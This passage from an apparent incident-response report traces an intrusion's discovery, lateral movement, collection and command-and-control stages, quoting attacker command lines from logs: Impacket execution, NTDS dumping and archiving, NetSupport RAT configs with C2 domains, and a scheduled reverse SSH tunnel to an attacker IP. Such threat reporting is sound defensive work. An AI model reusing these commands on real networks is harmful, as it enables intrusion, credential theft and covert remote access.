observed:\n\n```\ncmd.exe /Q /c cmdkey /list 1> \\\\127.0.0.1\\ADMIN$\\__REDACTED 2>&1\ncmd.exe /Q /c dor 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd programdata 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c ls 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c dir 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\ncmd.exe /Q /c whoami /all 1> \\\\127.0.0.1\\ADMIN$\\____REDACTED  2>&1\n```\n\nAfter the _Impacket_ activity, the threat actor returned later to a domain controller and a backup server, where additional tooling was used for discovery. The first was PingCastle, an active directory auditing tool. On the domain controller, the threat actor executed the following commands:\n\n```\nwhoami\nnet  group \"Domain Admins\"\nquser\nC:\\ProgramData\\start.bat\n➝ starting \"pingcastle.exe --healthcheck --level Full\"\nC:\\ProgramData\\ntds.bat\n  ➝ script to dump the ntds\n```\n\nThe second one was the SoftPerfect Network Scanner. This utility is commonly used by threat actors. While a paid utility, many use the free trial version. However, during this intrusion, the actor clearly did not pay for its version, as they brought their own keygen. On the backup server, the threat actor executed the following commands:\n\n```\n \"C:\\Program Files\\7-Zip\\7zG.exe\" x -o\"C:\\Users\\Public\\netscan_portable\\\" -spe -an -ai#7zMap24244:76:7zEvent17814\n\nC:\\Users\\Public\\netscan_portable\\64-bit\\SoftPerfect_<REDACTED>Patch_Keygen_v2<REDACTED>.exe\"\n\"C:\\Users\\Public\\netscan_portable\\64-bit\\netscan.exe\"\n```\n\nDuring the later stage of the intrusion, the threat actor dumped the event 4624 logs from a domain controller. These were written to the file mf.txt. This file was later added to a zip archive. The file was not looked at on the host it was dumped on. The dumping of these logs may have been to review user logon activity across the environment.\n\n```\npowershell  -w hidden -C \"Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' -MaxEvents 1 | sort-object timeCreated | select-object -ExpandProperty message\"\npowershell  -w hidden -C \"Get-WinEvent -Logname 'security' -FilterXPath '*[System[EventID=4624]]' | sort-object timeCreated | select-object -ExpandProperty message\"\n```\n\n## Lateral Movement\n\nThe threat actor heavily used the reverse SSH tunnel discussed within the Command and Control section to assist in lateral movement. Through this tunnel, the threat actor was able to proxy their access from the beachhead to other assets in the network using a handful of different techniques, including WMI, and RDP.\n\nAs mentioned in the discovery section, Impacket’s atexec module was utilized within the SSH tunnel to proxy traffic to a domain controller to assist with lateral movement. In between executions of atexec, we see Windows Security event logs that match behavior of lateral movement:\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a table containing two rows of security event log information, specifically event IDs 4624 and 4634. The first row describes the logon event, indicating the use of NTLM protocol with details about two logins: one for task creation and another for retrieving results. The second row outlines the logoff event that corresponds to the same login ID as the previous event, noting the time taken to execute the command between the logon and logoff.\nTranscription: |\n  | Event ID | Log Type | Description                                                                                                                                          |\n  | -------- | -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | 4624     | Security | Logon type 3 and NTLM protocol used - 2 logins one for the task creation and the second is for retrieving the results.                               |\n  | 4634     | Security | Logoff with the same login ID as the login event above. The time between the first login and its logoff indicates the time taken to run the command. |\n```\n\n```image\nAlt: Lateral Movement\nDescription: The image displays a table of Windows Security event logs, detailing various events related to user logon activities. It includes columns for timestamps, event codes, related users, authentication package names, logon IDs, logon types, and command lines associated with the processes. Key highlights include the use of NTLM for authentication and specific commands executed, such as 'atexec' found between user login and logoff events. The visual layout aids in understanding the sequence and nature of actions performed during lateral movement within a network.\nTranscription: |\n  | @timestamp               | event.code | related.user  | winlog.event_data.AuthenticationPackageName | winlog.logon.id | winlog.event_data.LogonType | process.parent.command_line                                     | process.command_line |\n  | ------------------------ | ---------- | ------------- | ------------------------------------------- | --------------- | --------------------------- | --------------------------------------------------------------- | -------------------- |\n  | 2023-01-24T10:56:02.797Z | 4624       | Administrator | NTLM                                        | 0x30e59de       | 3                           | C:\\Windows\\system32\\svchost.exe -k netsvcs -p                   | -                    |\n  | 2023-01-24T10:56:02.797Z | 4624       | Administrator | NTLM                                        | 0x30e59de       | 3                           | -                                                               | -                    |\n  | 2023-01-24T10:56:02.797Z | 4624       | Administrator | NTLM                                        | 0x30e59de       | 3                           | -                                                               | -                    |\n  | 2023-01-24T10:56:04.976Z | 1          | SYSTEM        | -                                           | -               | -                           | -                                                               | -                    |\n  | 2023-01-24T10:56:05.289Z | 1          | SYSTEM        | -                                           | -               | -                           | -                                                               | -                    |\n  | 2023-01-24T10:56:05.374Z | 1          | SYSTEM        | -                                           | -               | -                           | -                                                               | -                    |\n  | 2023-01-24T10:57:17.847Z | 4634       | Administrator | -                                           | 0x30e59de       | 3                           | cmd.exe /C net group /domain > C:\\Windows\\Temp\\atWKmSa.tmp 2>&1 | net group /domain    |\n  | 2023-01-24T10:57:17.847Z | 4634       | Administrator | -                                           | 0x30e59de       | 3                           | C:\\Windows\\system32\\net1 group /domain                          | -                    |\n```\n\n### SMB\n\nDuring the intrusion, the threat actor used SMB to copy files over to other systems. Here, the files were not sent over the network in the clear, preventing network inspection, but we were able to inspect the file creation and deletion via event ID 5145 for File Share Auditing event. In the logs, we can see the AccessMask of 0x2 during the file write followed by 0x10080 during the file delete action.\n\n```image\nAlt: SMB Activity\nDescription: The image is a screenshot of a log table displaying details related to SMB activity during an intrusion. The table includes columns for event code, IP address, share name, relative target name, subject username, and access mask. Each row represents a file operation related to the 'cache.cab' file, showing repeated events with access masks of '0x2' for file writes and '0x10080' for file deletes. This log data is crucial for analyzing lateral movement techniques used by threat actors.\nTranscription: |\n  | event.code | winlog.event_data.ipAddress   | winlog.event_data.ShareName | winlog.event_data.RelativeTargetName | winlog.event_data.SubjectUserName | winlog.event_data.AccessMask |\n  | ---------- | ----------------------------- | --------------------------- | ------------------------------------ | --------------------------------- | ---------------------------- |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x2                          |\n  | 5145       | 10. . . . . . . . . . . . . . | \\\\*\\CS                      | programdata\\cache.cab                | Administrator                     | 0x10080                      |\n```\n\n### WMI\n\nImpacket’s wmiexec tool was used to pivot across the environment, extract the archived file `cache.cab`, and execute scheduled tasks to run NetSupport RAT on remote systems.\n\n```image\nAlt: WMI Activity\nDescription: The image displays a table detailing the lateral movement activity captured over a span of two days in a cybersecurity context. Each row lists timestamps, event codes, hostnames (e.g., 'DC #1', 'Backup Server'), and command line executions of the process `wmiprvs.exe` and related commands. The highlighted section indicates the extraction and expansion of an archived file named `cache.cab`, showcasing the steps taken to manipulate and execute commands remotely across different systems.\nTranscription: |\n  | @timestamp     | event.code | agent.hostname | process.parent.command_line                              | process.command_line                                                                  |\n  | -------------- | ---------- | -------------- | -------------------------------------------------------- | ------------------------------------------------------------------------------------- |\n  | DAY 4          |            |                |                                                          |                                                                                       |\n  | T22:24:38.059Z | 1          | DC #1          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:32:58.661Z | 1          | DC #2          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:37:27.321Z | 1          | Backup Server  | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:56:31.380Z | 1          | Server A       | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | T22:58:16.084Z | 1          | File Server    | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n  | DAY 5          |            |                |                                                          |                                                                                       |\n  | T00:19:07.110Z | 1          | File Server    | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C expand cache.cab -F:* c:\\programdata 1> \\\\127.0.0.1\\ADMIN\\$1674... 2>&1 |\n```\n\n```image\nAlt: WMI Activity\nDescription: The image is a table displaying various event logs related to WMI activity over two days. It includes columns such as timestamp, event code, agent hostname, process parent command line, and process command line. Each row captures specific instances where the 'wmiprvse.exe' process was invoked on different servers, along with the command lines used to create scheduled tasks. The table provides detailed insights into lateral movement within the environment, specifically showcasing the execution of scheduled tasks that run 'mswow86.exe' on remote systems.\nTranscription: |\n  | @timestamp     | event.code | agent.hostname | process.parent.command_line                              | process.command_line                                                                                                              |\n  | -------------- | ---------- | -------------- | -------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |\n  | DAY 4          |            |                |                                                          |                                                                                                                                   |\n  | T22:26:14.405Z | 1          | DC #1          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr 1> \\\\127.0.0.1\\ADMIN$\\_1674********7443 2>&1 |\n  | T22:26:33.407Z | 1          | DC #2          | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C start \"\" \"%programdata%%\\schcache\\mswow86.exe\" 1> \\\\127.0.0.1\\ADMIN$\\_1674********72743 2>&1                        |\n  | T22:31:44.076Z | 1          |                |                                                          |                                                                                                                                   |\n  | T22:38:28.336Z | 1          |                |                                                          |                                                                                                                                   |\n  | T22:52:10.290Z | 1          | Backup Server  | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr 1> \\\\127.0.0.1\\ADMIN$\\_1674********7964 2>&1 |\n  | T22:52:34.113Z | 1          | Server A       | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C start \"\" \"%programdata%%\\schcache\\mswow86.exe\" 1> \\\\127.0.0.1\\ADMIN$\\_1674********51836 2>&1                        |\n  | T22:57:84.888Z | 1          |                |                                                          |                                                                                                                                   |\n  | T22:59:11.685Z | 1          |                |                                                          |                                                                                                                                   |\n  | DAY 5          |            |                |                                                          |                                                                                                                                   |\n  | T00:20:51.885Z | 1          | File Server    | C:\\Windows\\system32\\wbem\\wmiprvs.exe -secured -Embedding | cmd.exe /Q /C schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr 1> \\\\127.0.0.1\\ADMIN$\\_1674********8875 2>&1 |\n  | T00:22:17.862Z | 1          |                |                                                          | cmd.exe /Q /C start \"\" \"%programdata%%\\schcache\\mswow86.exe\" 1> \\\\127.0.0.1\\ADMIN$\\_1674********8844 2>&1                         |\n```\n\nFor a breakdown of the process command line arguments, refer to this previous report.\n\n### RDP\n\nRemote Desktop Protocol (RDP) was used from the beachhead to two servers and two domain controllers on the network. We can verify this activity with Windows Event ID 4624 with logon type 10. This log triggers whenever a user successfully logs on to a computer or server via remote interactive logon (RDP or other remote desktop services).\n\nBelow illustrates the threat actor initiating RDP sessions from the beachhead to various servers within the network on day eight of this intrusion.\n\n```image\nAlt: RDP Sessions\nDescription: The image presents a table detailing Windows event logs related to Remote Desktop Protocol (RDP) sessions initiated by a threat actor. It includes columns for timestamp, event code, agent name, source IP, logon type, and username. The table indicates multiple successful logon events (event code 4624) with a specific focus on the type of logon (RemoteInteractive) and highlights a local user account created by the threat actor, labeled as 'WDAGUtilityAccount2'. This data is crucial for understanding lateral movement within the network during the intrusion.\nTranscription: |\n  | @timestamp     | event.code | agent.name           | source.ip | winlog.event_data.LogonType | winlog.logon.type | user.name             |\n  |----------------|------------|----------------------|-----------|-----------------------------|-------------------|-----------------------|\n  | T01:45:43.852Z | 4624       | Backup Server        | .137      | 10                          | RemoteInteractive | WDAGUtilityAccount2   |\n  | T02:29:20.539Z | 4624       | Server A             | .137      | 10                          | RemoteInteractive | Local Service Account |\n  | T07:45:46.135Z | 4624       | Domain Controller #1 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n  | T09:29:33.393Z | 4624       | Domain Controller #1 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n  | T09:30:31.359Z | 4624       | Domain Controller #2 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n  | T10:09:46.243Z | 4624       | Domain Controller #2 | .137      | 10                          | RemoteInteractive | Compromised User #2   |\n```\n\nBelow, illustrates the full network architecture and lateral movement seen within this incident.\n\n```image\nAlt: Network Architecture\nDescription: The image depicts a network architecture diagram illustrating the lateral movement of a threat actor within a victim network. It shows the connection from the threat actor's VPS (Virtual Private Server) through a reverse SSH tunnel to the beachhead on the victim network, highlighting the TCP ports used (22 and 2222). Various servers, including domain controllers (DC A, DC B), a backup server, and a VPN server, are represented, indicating the pathways of RDP (Remote Desktop Protocol) and Impacket connections, which are illustrated with dashed and solid lines respectively. The diagram visually conveys the flow of data and the relationships between different components in the network during an intrusion.\nTranscription: |\n  Internet\n  VPS\n  Threat Actor\n  185.206.146.129\n  \n  Reverse SSH Tunnel\n  TCP 22 → TCP 2222\n  \n  Victim Network\n  Beachhead\n  \n  - Fileshare\n  - Backup Server\n  - DC A\n  - DC B\n  - Server A\n  - VPN Server\n  \n  Key:\n  - Solid lines indicate \"Impacket\"\n  - Dashed lines indicate \"RDP\"\n```\n\nDuring the intrusion, the threat actor revealed two different host names leaked in various Windows Event logs during their RDP sessions.\n\n```\nDESKTOP-TBDQ6K1\nWIN-5ODCFIGQRP3\n```\n\nExample Windows event ID 4776:\n\n```image\nAlt: Event ID 4776\nDescription: The image displays a log entry related to a Windows authentication attempt. It includes details such as the authentication package used, the logon account name (WDAGUtilityAccount2), the source workstation (DESKTOP-TBDQ6K1), and an error code (0x0), indicating the attempt to validate credentials for an account.\nTranscription: |\n  The computer attempted to validate the credentials for an account.\n  Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0\n  Logon Account: WDAGUtilityAccount2\n  Source Workstation: DESKTOP-TBDQ6K1\n  Error Code: 0x0\n```\n\nExample Windows event ID 4624:\n\n```image\nAlt: Event ID 4624\nDescription: The image displays a Windows Event Log entry indicating a successful logon event. Key details include the Security ID, Logon Type (which is set to 3, indicating a network logon), and the Workstation Name (DESKTOP-TBDQ6K1). It also shows information about the New Logon, including the Account Name (WDAGUtilityAccount2) and the Logon GUID. Additional fields pertain to the authentication process, specifying the Logon Process as NtLmSsp and the Authentication Package as NTLM.\nTranscription: |\n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-0-0\n    Account Name: -\n    Account Domain: -\n    Logon ID: 0x0\n  \n  Logon Information:\n    Logon Type: 3\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-4111996580-4053983655-1651626109-1002\n    Account Name: WDAGUtilityAccount2\n    Account Domain: -\n    Logon ID: 0x57FB0B8\n    Linked Logon ID: 0x0\n    Network Account Name: -\n    Network Account Domain: -\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0x0\n    Process Name: -\n  \n  Network Information:\n    Workstation Name: DESKTOP-TBDQ6K1\n    Source Network Address: 10.***.137\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: NtLmSsp\n    Authentication Package: NTLM\n    Transited Services: -\n    Package Name (NTLM only): NTLM V2\n    Key Length: 128\n```\n\nExample Windows event ID 4779:\n\n```image\nAlt: Event ID 4779\nDescription: The image depicts a log entry detailing an RDP (Remote Desktop Protocol) session disconnection from a Windows Station. Key information includes the account name 'WDAGUtilityAccount2', account domain, and logon ID. The session name is specified as 'RDP-Tcp#1'. Additional information reveals the client name as 'DESKTOP-TBDQ6K1' along with a masked client address. This log entry is relevant to monitoring user activity and understanding session management during a security incident.\nTranscription: |\n  A session was disconnected from a Window Station.\n  Subject:\n      Account Name: WDAGUtilityAccount2\n      Account Domain:\n      Logon ID: 0x581A582\n  Session:\n      Session Name: RDP-Tcp#1\n  Additional Information:\n      Client Name: DESKTOP-TBDQ6K1\n      Client Address: 10.***.137\n  This event is generated when a user disconnects from an existing Terminal Services session, or when a user switches away from an existing desktop using Fast User Switching.\n```\n\n## Collection\n\nThe threat actor was observed connecting to a file server from the Domain Controller and browsing multiple secretive documents on the system.\n\n```image\nAlt: File Server\nDescription: The image displays a table containing command lines related to processes executed on a Windows system. It shows the parent process 'C:\\Windows\\Explorer.EXE' and several instances of the 'C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE' command lines that include paths to potentially sensitive documents, indicated by the presence of '.docx' file extensions. The specific details of the document names are redacted.\nTranscription: |\n  | process.parent.command_line | process.command_line                                                      |\n  | --------------------------- | ------------------------------------------------------------------------- |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].doc\"  |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].docx\" |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].docx\" |\n  | C:\\Windows\\Explorer.EXE     | \"C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE\" \"\\\\[REDACTED].doc\"  |\n```\n\nAdditionally, we see the threat actor using 7-zip to collect the previously dumped ntds and a text file called mf.txt.\n\n```image\nAlt: 7-Zip Collection\nDescription: The image is a table displaying event logs related to the execution of the '7z.exe' process. It contains details such as event codes, process names, command lines used, and the parent process names along with their command lines. The table provides specific data on the actions taken by the threat actor, including commands to archive files and collect sensitive information.\nTranscription: |\n  | event.code | process.name | process.command_line                                         | process.parent.name | process.parent.command_line |\n  | ---------- | ------------ | ------------------------------------------------------------ | ------------------- | --------------------------- |\n  | 1          | 7z.exe       | 7z.exe a c:\\Users\\Public\\ntds.7z \"Active Directory\" registry | cmd.exe             | C:\\Windows\\system32\\cmd.exe |\n  | 1          | 7z.exe       | 7z.exe a mf.7z mf.txt                                        | cmd.exe             | C:\\Windows\\system32\\cmd.exe |\n```\n\n## Command and Control\n\n### NetSupport\n\nAs referenced in the Initial Access section, the NetSupport deployment script writes a `client32.ini` file to the AppData Roaming path, which specifies the primary and secondary gateway.\n\n```image\nAlt: NetSupport Gateway\nDescription: The image shows a screenshot of a Notepad window displaying the contents of a configuration file named 'client32.ini'. The file contains settings related to the NetSupport command and control (C2) communication, specifying the primary and secondary gateway addresses, port number, and other parameters. The details indicate the structure and values used for establishing communication in the context of a cybersecurity incident.\nTranscription: |\n  [HTTP]\n  CMPI=60\n  GatewayAddress=Npinmclaugh11.com:2145\n  GSK=GD;Q0IEO:E>IBLGE<DADFI<B\n  Port=2145\n  SecondaryGateway=Npinmclaugh14.com:2145\n  SecondaryPort=2145\n```\n\nThe primary gateway, `npinmclaugh11[.]com:2145`, was unsuccessful as it resolved to an IP of `127.0.0.127`. As a result, all communication was thus routed through the secondary gateway at `npinmclaugh14[.]com:2145`.\n\n```\nDns query:\nRuleName: -\nUtcTime: <DAY 1> 03:34:16.236\nProcessGuid: {a9d5a793-0bb7-63ca-9404-000000000300}\nProcessId: 7648\nQueryName: Npinmclaugh11.com\nQueryStatus: 0\nQueryResults: 127.0.0.127;\nImage: C:\\Users\\<REDACTED>\\AppData\\Roaming\\eHNjqgzZ\\presentationhost.exe\nUser: <REDACTED>\n```\n\n```\nDns query:\nRuleName: -\nUtcTime: <DAY 1> 03:34:18.828\nProcessGuid: {a9d5a793-0bb7-63ca-9404-000000000300}\nProcessId: 7648\nQueryName: Npinmclaugh14.com\nQueryStatus: 0\nQueryResults: 89.185.85.44;\nImage: C:\\Users\\<REDACTED>\\AppData\\Roaming\\eHNjqgzZ\\presentationhost.exe\nUser: <REDACTED>\n```\n\nNetSupport connections were established on day one to 89.185.85.44 on port 2145; however, on day five of the intrusion, another NetSupport `client32.ini` file was deployed to other assets on the network, introducing a new command and control server of `wsus-isv-local[.]tech:133` and `wsus-isv-internal[.]tech:133`.\n\n```image\nAlt: NetSupport C2\nDescription: The image displays a Notepad window containing the contents of a configuration file named 'client32.ini'. The file outlines the settings for a command and control (C2) server, with details such as 'GatewayAddress', 'SecondaryGateway', and their respective ports. The format used is structured, with sections clearly labeled, indicating the presence of configuration parameters for NetSupport.\nTranscription: |\n  [General]\n  [HTTP]\n  GatewayAddress=wsus-isv-local.tech:133\n  GSK=FK;Q@GCPGA:F=JBEGK<H@LEK:C?BDF\n  Port=133\n  SecondaryGateway=wsus-isv-internal.tech:133\n  SecondaryPort=133\n```\n\n```\nDns query:\nRuleName: -\nUtcTime: <DAY 4> 22:26:27.990\nProcessGuid: {1dc91c81-5b19-63d0-0806-000000000600}\nProcessId: 4852\nQueryName: wsus-isv-local.tech\nQueryStatus: 0\nQueryResults: 79.137.206.37;\nImage: C:\\ProgramData\\schcache\\mswow86.exe\nUser: <REDACTED>\\Administrator\n```\n\nThe following table provides a summary of all the domains and IPs used by NetSupport during this incident :\n\n| **NetSupport C2 Domain** | **DNS Resolve Status** | **Resolved IP** |\n| -------------------------| -----------------------| ----------------|\n| npinmclaugh11[.]com      | NOERROR                | 127.0.0.127     |\n| npinmclaugh14[.]com      | NOERROR                | 89.185.85.44    |\n| wsus-isv-local[.]tech    | NOERROR                | 79.137.206.37   |\n| wsus-isv-internal[.]tech | NXDOMAIN               | N/A             |\n\n```image\nAlt: NetSupport C2\nDescription: The image is a line graph titled \"NetSupport C2 Communication,\" illustrating the count of records associated with two IP addresses over a span of eight days. The x-axis represents the days (from Day 1 to Day 8), while the y-axis indicates the count of records. Two lines are plotted: one in blue representing the IP address 79.137.206.37, and the other in orange representing the IP address 89.185.85.44. The graph shows a significant spike in communication for the blue line starting on Day 7, indicating increased activity for the IP address 79.137.206.37, while the orange line exhibits relatively lower counts throughout the observed period.\nTranscription: |\n  Graph Title: NetSupport C2 Communication\n  \n  Y-Axis: Count of Records\n  X-Axis: Date\n  \n  Data Points:\n  - Day 1: 500 (79.137.206.37), 0 (89.185.85.44)\n  - Day 2: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 3: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 4: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 5: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 6: 0 (79.137.206.37), 0 (89.185.85.44)\n  - Day 7: 3000 (79.137.206.37), 0 (89.185.85.44)\n  - Day 8: 3000 (79.137.206.37), 0 (89.185.85.44)\n  \n  Line Colors:\n  - Blue: 79.137.206.37\n  - Orange: 89.185.85.44\n```\n\n### SSH Tunnelling\n\nOn day five of this intrusion, two scheduled tasks (“SSH Server” and “SSH Key Exchange”) were created on the beachhead to establish a local SSH server running on port 2222 for remote system 185.206.146.129.\n\n```image\nAlt: SSH Tunnelling\nDescription: The image displays a table of processes logged during 'Day 4' of an intrusion event. It includes the columns for timestamp, process name, process ID, and command line executed. Notably, two entries highlight commands related to the creation of scheduled tasks for an SSH server and SSH key exchange, which indicate the establishment of an SSH reverse tunnel. The commands emphasize the malicious intent of setting up remote access through SSH on a specified port.\nTranscription: |\n  | @timestamp | process.name  | process.pid    | process.command_line                                                                                                                                                                                                                                                  |\n  | ---------- | ------------- | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Day 4      | 08:30:37.850Z | ssh-keygen.exe | ssh-keygen -f C:\\ProgramData\\sshd\\config\\id_rsa -t rsa -N \"\"                                                                                                                                                                                                          |\n  |            | 08:30:42.129Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /inheritance:r                                                                                                                                                                                                                 |\n  |            | 08:30:42.158Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /grant:r \"<redacted>\" :\"(R)\"                                                                                                                                                                                                   |\n  |            | 08:30:42.178Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /inheritance:r                                                                                                                                                                                                                 |\n  |            | 08:30:42.202Z | icacls.exe     | C:\\ProgramData\\sshd\\config\\keys\\id_rsa /grant:r \"<redacted>\" :\"(R)\"                                                                                                                                                                                                   |\n  |            | 08:30:42.224Z | schtasks.exe   | /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"C:\\ProgramData\\sshd\\sshd.exe -f C:\\ProgramData\\sshd\\config\\sshd_config\"                                                                                                                                    |\n  |            | 08:30:42.335Z | schtasks.exe   | /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"C:\\ProgramData\\sshd\\ssh.exe -i C:\\ProgramData\\sshd\\config\\keys\\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15\" |\n```\n\n```image\nAlt: SSH Tunnelling\nDescription: The image is a tabular data representation showing SSH connection logs, detailing events captured by a monitoring system. The columns include 'event.dataset,' 'source.ip,' 'destination.ip,' 'destination.port,' 'zeek.ssh.server,' 'zeek.ssh.host_key,' 'destination.geo.country_name,' and 'destination.as.organization.name.' Each row corresponds to a separate SSH event, indicating connections made from the 'Beachhead' to the destination IP '185.206.146.129' on port 22. The 'zeek.ssh.server' shows the version of the SSH service running, and 'destination.as.organization.name' indicates the organization associated with the destination IP.\nTranscription: |\n  | event.dataset | source.ip | destination.ip  | destination.port | zeek.ssh.server                        | zeek.ssh.host_key                               | destination.geo.country_name | destination.as.organization.name |\n  | ------------- | --------- | --------------- | ---------------- | -------------------------------------- | ----------------------------------------------- | ---------------------------- | -------------------------------- |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       | Belcloud LTD                     |\n  | zeek.ssh      | Beachhead | 185.206.146.129 | 22               | SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 | bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef | Cyprus                       